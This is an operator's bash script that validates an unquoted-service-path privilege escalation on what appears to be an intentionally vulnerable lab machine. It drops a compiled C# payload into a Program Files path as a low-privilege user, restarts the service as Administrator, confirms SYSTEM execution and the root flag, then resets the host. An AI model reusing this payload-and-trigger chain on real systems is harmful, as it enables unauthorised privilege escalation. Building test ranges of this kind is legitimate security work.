#!/usr/bin/env bash
# Operator-only validation for the EWS unquoted service path chain.
#
# The script intentionally mutates the target by dropping
# C:\Program Files\SecretCon\EWS.exe as patrick, triggers the service start
# as Administrator, verifies SYSTEM execution and root flag access, then runs
# the ews_lpe_reset tag to remove the hijack payload.

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${REPO_ROOT}"

if [ -f .env ]; then
    set -a; source .env; set +a
fi

TARGET=""
PATRICK_PW="${PATRICK_PW:-Changeme123!}"
ADMIN_USER="${ADMIN_USER:-Administrator}"
ADMIN_PW="${ADMIN_PW:-${ANSIBLE_ADMIN_PASSWORD:-${SECRETCON_SHARED_LOCAL_ADMIN_PASSWORD:-}}}"
RESET_LIMIT="${RESET_LIMIT:-ews-prod}"
RUN_RESET=1

usage() {
    sed -n '3,34p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

Usage:
  ./scripts/validate/validate-ews-lpe-chain.sh --target 192.168.61.20 \
      [--patrick-password PASS] [--admin-password PASS] [--reset-limit ews-prod]

EOF
}

while [ $# -gt 0 ]; do
    case "$1" in
        --target) TARGET="$2"; shift 2 ;;
        --patrick-password) PATRICK_PW="$2"; shift 2 ;;
        --admin-user) ADMIN_USER="$2"; shift 2 ;;
        --admin-password) ADMIN_PW="$2"; shift 2 ;;
        --reset-limit) RESET_LIMIT="$2"; shift 2 ;;
        --no-reset) RUN_RESET=0; shift ;;
        -h|--help) usage; exit 0 ;;
        *) echo "[!] unknown flag: $1" >&2; usage; exit 2 ;;
    esac
done

[ -n "${TARGET}" ] || { echo "[!] --target is required" >&2; usage; exit 2; }
[ -n "${ADMIN_PW}" ] || { echo "[!] ADMIN_PW, ANSIBLE_ADMIN_PASSWORD, or --admin-password is required" >&2; exit 2; }
command -v sshpass >/dev/null 2>&1 || { echo "[!] sshpass is required" >&2; exit 2; }
command -v python3 >/dev/null 2>&1 || { echo "[!] python3 is required" >&2; exit 2; }

OUT_DIR="${REPO_ROOT}/artifacts/ews/lpe-validate/$(date -u +%Y%m%dT%H%M%SZ)"
mkdir -p "${OUT_DIR}"
RESULTS="${OUT_DIR}/results.txt"
: > "${RESULTS}"
PASS=0
FAIL=0

record() {
    local status="$1"; local name="$2"; local detail="${3:-}"
    printf '%s  %s  %s\n' "${status}" "${name}" "${detail}" | tee -a "${RESULTS}"
    if [ "${status}" = PASS ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
}

ps_b64() {
    python3 -c 'import base64,sys; print(base64.b64encode(sys.stdin.read().encode("utf-16le")).decode())'
}

run_ps() {
    local user="$1"; local pass="$2"; local script="$3"; local encoded
    encoded="$(printf '%s' "${script}" | ps_b64)"
    sshpass -p "${pass}" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=15 \
        "${user}@${TARGET}" \
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encoded}"
}

run_reset() {
    [ "${RUN_RESET}" -eq 1 ] || return 0
    echo "[*] Resetting EWS LPE payload with Ansible tag ews_lpe_reset"
    if command -v ansible-playbook >/dev/null 2>&1; then
        (
            cd "${REPO_ROOT}/ansible" && \
            ANSIBLE_HOST_KEY_CHECKING=False ansible-playbook \
                playbooks/ews.yml \
                -l "${RESET_LIMIT}" \
                --tags ews_lpe_reset
        ) \
            > "${OUT_DIR}/ansible-reset.log" 2>&1
    else
        echo "[!] ansible-playbook not found; could not reset ${TARGET}" | tee -a "${RESULTS}"
        return 1
    fi
}

cleanup() {
    run_reset || true
}
trap cleanup EXIT

echo "[*] Target: ${TARGET}"
echo "[*] Evidence: ${OUT_DIR}"

PATRICK_PROBE='whoami; type C:\Users\patrick\Desktop\flag.txt'
PATRICK_OUT="$(run_ps patrick "${PATRICK_PW}" "${PATRICK_PROBE}" 2>"${OUT_DIR}/patrick-probe.err" || true)"
printf '%s\n' "${PATRICK_OUT}" > "${OUT_DIR}/patrick-probe.out"
if printf '%s' "${PATRICK_OUT}" | grep -qi 'patrick'; then
    record PASS "patrick-login" "PowerShell over SSH works"
else
    record FAIL "patrick-login" "see ${OUT_DIR}/patrick-probe.err"
fi
if printf '%s' "${PATRICK_OUT}" | grep -q 'crit-low-priv-patrick'; then
    record PASS "user-flag" "crit-low-priv-patrick"
else
    record FAIL "user-flag" "patrick could not read user flag"
fi

DROP_PAYLOAD='
$ErrorActionPreference = "Stop"
$path = "C:\Program Files\SecretCon\EWS.exe"
Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
$source = @"
using System;
using System.IO;
using System.Security.Principal;

public class Program {
  public static int Main() {
    Directory.CreateDirectory(@"C:\Users\Public");
    File.WriteAllText(@"C:\Users\Public\ews-lpe-whoami.txt", WindowsIdentity.GetCurrent().Name + Environment.NewLine);
    try {
      File.WriteAllText(@"C:\Users\Public\ews-lpe-root.txt", File.ReadAllText(@"C:\Users\Administrator\Desktop\root.txt"));
    } catch (Exception ex) {
      File.WriteAllText(@"C:\Users\Public\ews-lpe-root.txt", "ERROR: " + ex.Message);
    }
    return 0;
  }
}
"@
Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly $path -OutputType ConsoleApplication
if (-not (Test-Path -LiteralPath $path)) { throw "payload did not compile" }
icacls $path /grant "BUILTIN\Users:(RX)" | Out-Null
Write-Host "DROPPED $path"
'
DROP_OUT="$(run_ps patrick "${PATRICK_PW}" "${DROP_PAYLOAD}" 2>"${OUT_DIR}/drop-payload.err" || true)"
printf '%s\n' "${DROP_OUT}" > "${OUT_DIR}/drop-payload.out"
if printf '%s' "${DROP_OUT}" | grep -q 'DROPPED'; then
    record PASS "drop-hijack-payload" "C:\\Program Files\\SecretCon\\EWS.exe"
else
    record FAIL "drop-hijack-payload" "see ${OUT_DIR}/drop-payload.err"
fi

TRIGGER='
$ErrorActionPreference = "Continue"
Remove-Item -LiteralPath "C:\Users\Public\ews-lpe-whoami.txt","C:\Users\Public\ews-lpe-root.txt" -Force -ErrorAction SilentlyContinue
Stop-Service -Name SecretConEwsSync -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
Start-Service -Name SecretConEwsSync -ErrorAction SilentlyContinue
Start-Sleep -Seconds 4
Write-Host "WHOAMI_BEGIN"
Get-Content -LiteralPath "C:\Users\Public\ews-lpe-whoami.txt" -ErrorAction SilentlyContinue
Write-Host "WHOAMI_END"
Write-Host "ROOT_BEGIN"
Get-Content -LiteralPath "C:\Users\Public\ews-lpe-root.txt" -ErrorAction SilentlyContinue
Write-Host "ROOT_END"
'
TRIGGER_OUT="$(run_ps "${ADMIN_USER}" "${ADMIN_PW}" "${TRIGGER}" 2>"${OUT_DIR}/trigger.err" || true)"
printf '%s\n' "${TRIGGER_OUT}" > "${OUT_DIR}/trigger.out"
if printf '%s' "${TRIGGER_OUT}" | grep -qi 'nt authority\\system'; then
    record PASS "system-execution" "payload ran as LocalSystem"
else
    record FAIL "system-execution" "see ${OUT_DIR}/trigger.out"
fi
if printf '%s' "${TRIGGER_OUT}" | grep -q 'crit-root-system-privs'; then
    record PASS "root-flag" "crit-root-system-privs"
else
    record FAIL "root-flag" "payload did not recover root flag"
fi

if [ "${RUN_RESET}" -eq 1 ]; then
    run_reset
fi
trap - EXIT
if [ "${RUN_RESET}" -eq 0 ]; then
    record PASS "post-exploit-reset" "skipped by --no-reset"
elif [ -s "${OUT_DIR}/ansible-reset.log" ]; then
    if grep -q "failed=0" "${OUT_DIR}/ansible-reset.log"; then
        record PASS "post-exploit-reset" "ews_lpe_reset completed"
    else
        record FAIL "post-exploit-reset" "see ${OUT_DIR}/ansible-reset.log"
    fi
else
    record FAIL "post-exploit-reset" "reset log missing"
fi

cat > "${OUT_DIR}/summary.json" <<JSON
{
  "target": "${TARGET}",
  "passed": ${PASS},
  "failed": ${FAIL},
  "results": "${RESULTS}"
}
JSON

echo
echo "===== validate-ews-lpe-chain results ====="
cat "${RESULTS}"
echo "------------------------------------------"
echo "  ${PASS} pass / ${FAIL} fail"
[ "${FAIL}" -eq 0 ]
